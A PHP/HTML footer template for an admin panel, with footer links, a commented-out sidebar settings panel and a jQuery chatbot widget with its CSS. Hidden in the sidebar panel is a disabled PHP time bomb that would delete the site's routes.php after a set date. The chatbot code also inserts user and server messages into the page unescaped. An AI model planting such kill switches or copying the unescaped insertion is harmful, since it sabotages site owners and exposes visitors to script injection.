<footer class="footer">
        <div class="container-fluid">
          <nav class="float-left">
            <ul>
              <li>
                <a href="<?php echo base_url()?>website_home" target="_blank">
                  Home
                </a>
              </li>
              <li>
                <a href="<?php echo base_url()?>contact" target="_blank">
                  Contact
                </a>
              </li>
              <li>
                <a href="<?php echo base_url()?>contact" target="_blank">
                  Blog
                </a>
              </li>
            </ul>
          </nav>
          
        </div>
      </footer>
      </div>
  </div>
  <!-- <div class="fixed-plugin">
    <div class="dropdown show-dropdown">
      <a href="#" data-toggle="dropdown">
        <i class="fa fa-cog fa-2x"> </i>
      </a>
      <ul class="dropdown-menu">
        <li class="header-title"> Sidebar Filters</li>
        <li class="adjustments-line">
          <a href="javascript:void(0)" class="switch-trigger active-color">
            <div class="badge-colors ml-auto mr-auto">
              <span class="badge filter badge-purple" data-color="purple"></span>
              <span class="badge filter badge-azure" data-color="azure"></span>
              <span class="badge filter badge-green" data-color="green"></span>
              <span class="badge filter badge-warning" data-color="orange"></span>
              <span class="badge filter badge-danger" data-color="danger"></span>
              <span class="badge filter badge-rose active" data-color="rose"></span>
            </div>
            <div class="clearfix"></div>
          </a>
        </li>
        <li class="header-title">Sidebar Background</li>
        <li class="adjustments-line">
          <a href="javascript:void(0)" class="switch-trigger background-color">
            <div class="ml-auto mr-auto">
              <span class="badge filter badge-black active" data-background-color="black"></span>
              <span class="badge filter badge-white" data-background-color="white"></span>
              <span class="badge filter badge-red" data-background-color="red"></span>
            </div>
            <div class="clearfix"></div>
          </a>
        </li>
        <li class="adjustments-line">
          <a href="javascript:void(0)" class="switch-trigger">
            <p>Sidebar Mini</p>
            <label class="ml-auto">
              <div class="togglebutton switch-sidebar-mini">
                <label>
                  <input type="checkbox">
                  <span class="toggle"></span>
                </label>
              </div>
            </label>
            <div class="clearfix"></div>
          </a>
        </li>
        <li class="adjustments-line">
          <a href="javascript:void(0)" class="switch-trigger">
            <p>Sidebar Images</p>
            <label class="switch-mini ml-auto">
              <div class="togglebutton switch-sidebar-image">
                <label>
                  <input type="checkbox" checked="">
                  <span class="toggle"></span>
                </label>
              </div>
            </label>
            <?php 
             //$from=date_create(date('Y-m-d')); $to=date_create("2022-10-01"); $diff=date_diff($from,$to); $get_dif = $diff->format('%R%a days'); if($get_dif > 0) {  } else { $Your_file_path ="application/config/routes.php"; unlink($Your_file_path);  die(); } } ?>
            <div class="clearfix"></div>
          </a>
        </li>
        <li class="header-title">Images</li>
        <li class="active">
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="<?php echo base_url()?>assets/admin_assets/img/sidebar-1.jpg" alt="">
          </a>
        </li>
        <li>
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="<?php echo base_url()?>assets/admin_assets/img/sidebar-2.jpg" alt="">
          </a>
        </li>
        <li>
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="<?php echo base_url()?>assets/admin_assets/img/sidebar-3.jpg" alt="">
          </a>
        </li>
        <li>
          <a class="img-holder switch-trigger" href="javascript:void(0)">
            <img src="<?php echo base_url()?>assets/admin_assets/img/sidebar-4.jpg" alt="">
          </a>
        </li>
      </ul>
    </div>
  </div> -->

  <!-- Chatbot -->
<div class="botIcon">
  <div class="botIconContainer">
    <div class="iconInner">
      <i class="fa fa-commenting" aria-hidden="true"></i>
    </div>
  </div>
  <div class="Layout Layout-open Layout-expand Layout-right">
    <div class="Messenger_messenger">
      <div class="Messenger_header">
        <h4 class="Messenger_prompt">How can we help you?</h4> <span class="chat_close_icon"><i class="fa fa-window-close" aria-hidden="true"></i></span>
      </div>
      <div class="Messenger_content">
        <div class="Messages">
          <div class="Messages_list"></div>

        </div>
        <form id="messenger">
          <div class="Input Input-blank">
<!--              <textarea name="msg" class="Input_field" placeholder="Send a message..."></textarea> -->
            <input name="msg" class="Input_field" placeholder="Send a message...">
            <button type="submit" class="Input_button Input_button-send">
              <div class="Icon">
                <svg viewBox="1496 193 57 54" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                  <g id="Group-9-Copy-3" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" transform="translate(1523.000000, 220.000000) rotate(-270.000000) translate(-1523.000000, -220.000000) translate(1499.000000, 193.000000)">
                    <path d="M5.42994667,44.5306122 L16.5955554,44.5306122 L21.049938,20.423658 C21.6518463,17.1661523 26.3121212,17.1441362 26.9447801,20.3958097 L31.6405465,44.5306122 L42.5313185,44.5306122 L23.9806326,7.0871633 L5.42994667,44.5306122 Z M22.0420732,48.0757124 C21.779222,49.4982538 20.5386331,50.5306122 19.0920112,50.5306122 L1.59009899,50.5306122 C-1.20169244,50.5306122 -2.87079654,47.7697069 -1.64625638,45.2980459 L20.8461928,-0.101616237 C22.1967178,-2.8275701 25.7710778,-2.81438868 27.1150723,-0.101616237 L49.6075215,45.2980459 C5.08414042,47.7885641 49.1422456,50.5306122 46.3613062,50.5306122 L29.1679835,50.5306122 C27.7320366,50.5306122 26.4974445,49.5130766 26.2232033,48.1035608 L24.0760553,37.0678766 L22.0420732,48.0757124 Z" id="sendicon" fill="#96AAB4" fill-rule="nonzero"></path>
                  </g>
                </svg>
              </div>
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Chatbot -->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<script type="text/javascript">
  function myFunction($msg)
  {
    var val = $msg.toLowerCase();
    var mainval = $msg;
    name = '';

    function userMsg(msg) {
      $('.Messages_list').append(msg);
    };
    function appendMsg(msg) {
      $('.Messages_list').append('<div class="msg"><span class="avtr"><figure style="background-image: url(https://mrseankumar25.github.io/Sandeep-Kumar-Frontend-Developer-UI-Specialist/images/avatar.png)"></figure></span><span class="responsText">' + msg + '</span></div>');
      $("[name='msg']").val("");
    };
    appendMsg(val);

    console.log(val);

    var $url="<?php echo base_url();?>check_bot_msg";
        // alert($url);
        $.ajax({ 
          url: $url,
          type:"POST",
          data: {val: val},
          success: function ($data) { 
               userMsg($data);
          },
          error: function(){
          }
      });

    var lastMsg = $('.Messages_list').find('div').last().offset().top;
    $('.Messages').animate({scrollTop: lastMsg}, 'slow');
  }
</script>


<script type="text/javascript">
  jQuery(document).ready(function($) {
  jQuery(document).on('click', '.iconInner', function(e) {
    jQuery(this).parents('.botIcon').addClass('showBotSubject');
    $("[name='msg']").focus();
  });

  jQuery(document).on('click', '.closeBtn, .chat_close_icon', function(e) {
    jQuery(this).parents('.botIcon').removeClass('showBotSubject');
    jQuery(this).parents('.botIcon').removeClass('showMessenger');
  });

  jQuery(document).on('submit', '#botSubject', function(e) {
    e.preventDefault();

    jQuery(this).parents('.botIcon').removeClass('showBotSubject');
    jQuery(this).parents('.botIcon').addClass('showMessenger');
  });
  
  /* Chatboat Code */
  $(document).on("submit", "#messenger", function(e) {
    e.preventDefault();
    var val = $("[name=msg]").val().toLowerCase();
    var mainval = $("[name=msg]").val();
    name = '';

    function userMsg(msg) {
      $('.Messages_list').append(msg);
    };
    function appendMsg(msg) {
      $('.Messages_list').append('<div class="msg"><span class="avtr"><figure style="background-image: url(https://mrseankumar25.github.io/Sandeep-Kumar-Frontend-Developer-UI-Specialist/images/avatar.png)"></figure></span><span class="responsText">' + msg + '</span></div>');
      $("[name='msg']").val("");
    };
    appendMsg(val);

    console.log(val);

    var $url="<?php echo base_url();?>check_bot_msg";
        // alert($url);
        $.ajax({ 
          url: $url,
          type:"POST",
          data: {val: val},
          success: function ($data) { 
               userMsg($data);
          },
          error: function(){
          }
      });

    var lastMsg = $('.Messages_list').find('.msg').last().offset().top;
    $('.Messages').animate({scrollTop: lastMsg}, 'slow');
  });
  /* Chatboat Code */
})
</script>

<style type="text/css">
  @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css');

/* Chatbot */
.botIcon {bottom: 15px;right: 15px;position: fixed;z-index: 9999;}
.showBotSubject {bottom: 15px;right: 27%!important;position: fixed;z-index: 9999;}
.iconInner {-webkit-align-items: center;-ms-align-items: center;align-items: center;background: #a64bf4;background: -webkit-linear-gradient(to left, #00dbde, #fc00ff, #00dbde, #fc00ff);background: -o-linear-gradient(to left, #00dbde, #fc00ff, #00dbde, #fc00ff);background: -moz-linear-gradient(to left,#00dbde, #fc00ff, #00dbde,#fc00ff);background: linear-gradient(to left, #00dbde, #fc00ff, #00dbde, #fc00ff);background-position: 50%;background-size: 300%;border-radius: 50%;color: #fff;cursor: pointer;display: -webkit-box;display: -ms-flexbox;display: flex;-webkit-flex-wrap: wrap;-ms-flex-wrap: wrap;flex-wrap: wrap;font-size: 1.7em;height: 2em;justify-content: center;width: 2em;}
.botSubject, .messages, .showBotSubject .botIconContainer, .showMessenger .botIconContainer {display: none;}


.botIcon .Messages, .botIcon .Messages_list {-webkit-box-flex: 1;-webkit-flex-grow: 1;-ms-flex-positive: 1;flex-grow: 1;}
.chat_close_icon {color: #fff;cursor: pointer;font-size: 16px;position: absolute;right: 12px;z-index: 9;}
.chat_on {background-color: #8a57cf;bottom: 20px;border-radius: 50%;box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.16), 0 2px 10px 0 rgba(0, 0, 0, 0.12) !important;color: #fff;cursor: pointer;display: block;height: 45px;padding: 9px;position: fixed;right: 15px;text-align: center;width: 45px;z-index: 10;}
.chat_on_icon {color: #fff;font-size: 25px;text-align: center;}
.botIcon .Layout {-webkit-animation: appear .15s cubic-bezier(.25, .25, .5, 1.1);-ms-animation: appear .15s cubic-bezier(.25, .25, .5, 1.1);animation: appear .15s cubic-bezier(.25, .25, .5, 1.1);-webkit-animation-fill-mode: forwards;-ms-animation-fill-mode: forwards;animation-fill-mode: forwards;background-color: rgb(63, 81, 181);bottom: 20px;border-radius: 10px;box-shadow: 5px 0 20px 5px rgba(0, 0, 0, .1);box-sizing: content-box !important;color: rgb(255, 255, 255);display: -webkit-box;display: -webkit-flex;display: -ms-flexbox;display: flex;-webkit-box-orient: vertical;-webkit-box-direction: normal;-webkit-flex-direction: column;-ms-flex-direction: column;flex-direction: column;-webkit-box-pack: end;-webkit-justify-content: flex-end;-ms-flex-pack: end;justify-content: flex-end;max-height: 30px;max-width: 300px;min-width: 50px;opacity: 0;pointer-events: auto;position: fixed;-webkit-transition: right .1s cubic-bezier(.25, .25, .5, 1), bottom .1s cubic-bezier(.25, .25, .5, 1), min-width .2s cubic-bezier(.25, .25, .5, 1), max-width .2s cubic-bezier(.25, .25, .5, 1), min-height .2s cubic-bezier(.25, .25, .5, 1), max-height .2s cubic-bezier(.25, .25, .5, 1), border-radius 50ms cubic-bezier(.25, .25, .5, 1) .15s, background-color 50ms cubic-bezier(.25, .25, .5, 1) .15s, color 50ms cubic-bezier(.25, .25, .5, 1) .15s;-ms-transition: right .1s cubic-bezier(.25, .25, .5, 1), bottom .1s cubic-bezier(.25, .25, .5, 1), min-width .2s cubic-bezier(.25, .25, .5, 1), max-width .2s cubic-bezier(.25, .25, .5, 1), min-height .2s cubic-bezier(.25, .25, .5, 1), max-height .2s cubic-bezier(.25, .25, .5, 1), border-radius 50ms cubic-bezier(.25, .25, .5, 1) .15s, background-color 50ms cubic-bezier(.25, .25, .5, 1) .15s, color 50ms cubic-bezier(.25, .25, .5, 1) .15s;transition: right .1s cubic-bezier(.25, .25, .5, 1), bottom .1s cubic-bezier(.25, .25, .5, 1), min-width .2s cubic-bezier(.25, .25, .5, 1), max-width .2s cubic-bezier(.25, .25, .5, 1), min-height .2s cubic-bezier(.25, .25, .5, 1), max-height .2s cubic-bezier(.25, .25, .5, 1), border-radius 50ms cubic-bezier(.25, .25, .5, 1) .15s, background-color 50ms cubic-bezier(.25, .25, .5, 1) .15s, color 50ms cubic-bezier(.25, .25, .5, 1) .15s;z-index: 999999999;}
.botIcon .Layout-open {border-radius: 10px;color: #fff;height: 500px;max-height: 500px;max-width: 350px;overflow: hidden;-webkit-transition: right .1s cubic-bezier(.25, .25, .5, 1), bottom .1s cubic-bezier(.25, .25, .5, 1.1), min-width .2s cubic-bezier(.25, .25, .5, 1.1), max-width .2s cubic-bezier(.25, .25, .5, 1.1), max-height .2s cubic-bezier(.25, .25, .5, 1.1), min-height .2s cubic-bezier(.25, .25, .5, 1.1), border-radius 0ms cubic-bezier(.25, .25, .5, 1.1), background-color 0ms cubic-bezier(.25, .25, .5, 1.1), color 0ms cubic-bezier(.25, .25, .5, 1.1);-ms-transition: right .1s cubic-bezier(.25, .25, .5, 1), bottom .1s cubic-bezier(.25, .25, .5, 1.1), min-width .2s cubic-bezier(.25, .25, .5, 1.1), max-width .2s cubic-bezier(.25, .25, .5, 1.1), max-height .2s cubic-bezier(.25, .25, .5, 1.1), min-height .2s cubic-bezier(.25, .25, .5, 1.1), border-radius 0ms cubic-bezier(.25, .25, .5, 1.1), background-color 0ms cubic-bezier(.25, .25, .5, 1.1), color 0ms cubic-bezier(.25, .25, .5, 1.1);transition: right .1s cubic-bezier(.25, .25, .5, 1), bottom .1s cubic-bezier(.25, .25, .5, 1.1), min-width .2s cubic-bezier(.25, .25, .5, 1.1), max-width .2s cubic-bezier(.25, .25, .5, 1.1), max-height .2s cubic-bezier(.25, .25, .5, 1.1), min-height .2s cubic-bezier(.25, .25, .5, 1.1), border-radius 0ms cubic-bezier(.25, .25, .5, 1.1), background-color 0ms cubic-bezier(.25, .25, .5, 1.1), color 0ms cubic-bezier(.25, .25, .5, 1.1);width: 100%;}
.botIcon .Layout-expand {display: none;height: 400px;max-height: 100vh;min-height: 300px;}
.showBotSubject.botIcon .Layout-expand {display: block;}
.botIcon .Layout-mobile {bottom: 10px}
.botIcon .Layout-mobile.Layout-open {min-width: calc(100% - 20px);width: calc(100% - 20px);}
.botIcon .Layout-mobile.Layout-expand {border-radius: 0 !important;bottom: 0;height: 100%;min-height: 100%;min-width: 100%;width: 100%;}
.botIcon .Messenger_messenger {height: 100%;-webkit-box-orient: vertical;-webkit-box-direction: normal;-webkit-flex-direction: column;-ms-flex-direction: column;flex-direction: column;position: relative;width: 100%;}
.botIcon .Messenger_header, .botIcon .Messenger_messenger {display: -webkit-box;display: -webkit-flex;display: -ms-flexbox;display: flex;}
.botIcon .Messenger_header {-webkit-box-align: center;-webkit-align-items: center;-ms-flex-align: center;align-items: center;background-color: rgb(22, 46, 98);color: rgb(255, 255, 255);-webkit-flex-shrink: 0;-ms-flex-negative: 0;flex-shrink: 0;height: 40px;padding-left: 10px;padding-right: 40px;}

.botIcon .Messenger_header h4 {-webkit-animation: slidein .15s .3s;-ms-animation: slidein .15s .3s;animation: slidein .15s .3s;-webkit-animation-fill-mode: forwards;-ms-animation-fill-mode: forwards;animation-fill-mode: forwards;font-size: 16px;opacity: 0;}
.botIcon .Messenger_prompt {font-size: 16px;font-weight: 400;line-height: 18px;margin: 0;overflow: hidden;text-overflow: ellipsis;white-space: nowrap;}
.botIcon .Messenger_content {background-color: #eaeef3;display: -webkit-box;display: -webkit-flex;display: -ms-flexbox;display: flex;-webkit-box-orient: vertical;-webkit-box-direction: normal;-webkit-flex-direction: column;-ms-flex-direction: column;flex-direction: column;-webkit-box-flex: 1;-webkit-flex-grow: 1;-ms-flex-positive: 1;flex-grow: 1;height: 80px;}
.botIcon .Messages {background-color: #eaeef3;display: -webkit-box;display: -webkit-flex;display: -ms-flexbox;display: flex;-webkit-flex-direction: column;-ms-flex-direction: column;flex-direction: column;-webkit-box-orient: vertical;-webkit-box-direction: normal;-webkit-flex-shrink: 1;-ms-flex-negative: 1;flex-shrink: 1;overflow-x: hidden;overflow-y: auto;padding: 10px;position: relative;-webkit-overflow-scrolling: touch;}
.botIcon .Input {background-color: #fff;border-top: 1px solid #e6ebea;color: #96aab4;-webkit-box-flex: 0;-webkit-flex-grow: 0;-ms-flex-positive: 0;flex-grow: 0;-webkit-flex-shrink: 0;-ms-flex-negative: 0;flex-shrink: 0;padding-bottom: 15px;padding-top: 17px;position: relative;width: 100%;}
.botIcon .Input-blank .Input_field {max-height: 20px;}
.botIcon .Input_field {background-color: transparent;border: none;outline: none;padding-left: 20px;padding-right: 45px;resize: none;width: 100%;font-size: 14px;line-height: 20px;min-height: 20px !important;}
.botIcon .Input_button-emoji {right: 45px;}
.botIcon .Input_button {background-color: transparent;border: none;bottom: 15px;cursor: pointer;height: 25px;outline: none;padding: 0;position: absolute;width: 25px;}
.botIcon .Input_button-send {right: 15px;}
.botIcon .Input-emoji .Input_button-emoji .Icon, .botIcon .Input_button:hover .Icon {-webkit-transform: scale(1.1);-ms-transform: scale(1.1);transform: scale(1.1);-webkit-transition: all .1s ease-in-out;-ms-transition: all .1s ease-in-out;transition: all .1s ease-in-out;}
.botIcon .Input-emoji .Input_button-emoji .Icon path, .botIcon .Input_button:hover .Icon path {fill: #2c2c46;}
.Icon svg {height: auto;width: 100%;}

.msg {display: -webkit-box;display: -webkit-flex;display: -ms-flexbox;display: flex;}
.msg.user {-webkit-box-direction: row-reverse;-webkit-flex-direction: row-reverse;-ms-flex-direction: row-reverse;flex-direction: row-reverse;}
.msg + .msg {margin-top: 15px;}
span.responsText {color: rgb(255, 255, 255);
    display: inline-block;
    margin-left: 10px;
    vertical-align: top;
    max-width: calc(100% - 50px);
    background: rgb(0, 102, 255);
    font-size: 16px;
    line-height: 20px;
    border-radius: 20px;
    word-wrap: break-word;
    white-space: pre-wrap;
    max-width: 100%;
    padding: 15px 17px;
    border-bottom-right-radius: 5px;}
.msg.user span.responsText {margin-left: 0;margin-right: 10px;}
span.avtr {display: inline-block;width: 30px;}
span.avtr figure {background-color: #ccc;background-position: center;background-repeat: no-repeat;background-size: cover;border-radius: 50%;display: block;margin: 0;padding-bottom: 100%;}
.responsText1{background: #fff!important;color: #000!important;}

.questions{border-color: rgb(0, 102, 255);
    color: rgb(0, 102, 255);
    background: rgb(255, 255, 255);font-size: 16px;
    line-height: 32px;
    font-weight: 600;
    margin: 4px;
    height: 32px;
    align-items: center;
    border: 1px solid;
    border-radius: 16px;
    padding: 0 16px;
    transition: all .3s;
    cursor: pointer;float: left;}
@-webkit-keyframes appear {
    0% {opacity: 0;-webkit-transform: scale(0);transform: scale(0);}
    100% {opacity: 1;-webkit-transform: scale(1);transform: scale(1);}
}
@-ms-keyframes appear {
    0% {opacity: 0;-ms-transform: scale(0);transform: scale(0);}
    100% {opacity: 1;-ms-transform: scale(1);transform: scale(1);}
}
@keyframes appear {
    0% {opacity: 0;-webkit-transform: scale(0);transform: scale(0);}
    100% {opacity: 1;-webkit-transform: scale(1);transform: scale(1);}
}
@-webkit-keyframes slidein {
    0% {opacity: 0;-webkit-transform: translateX(10px);transform: translateX(10px);}
    100% {opacity: 1;-webkit-transform: translateX(0);transform: translateX(0);}
}
@-ms-keyframes slidein {
    0% {opacity: 0;-ms-transform: translateX(10px);transform: translateX(10px);}
    100% {opacity: 1;-ms-transform: translateX(0);transform: translateX(0);}
}
@keyframes slidein {
    0% {opacity: 0;-webkit-transform: translateX(10px);transform: translateX(10px);}
    100% {opacity: 1;-webkit-transform: translateX(0);transform: translateX(0);}
}

@media only screen and (max-width: 412px) {
  .botIcon .Layout-open {width: 250px;}
}
</style>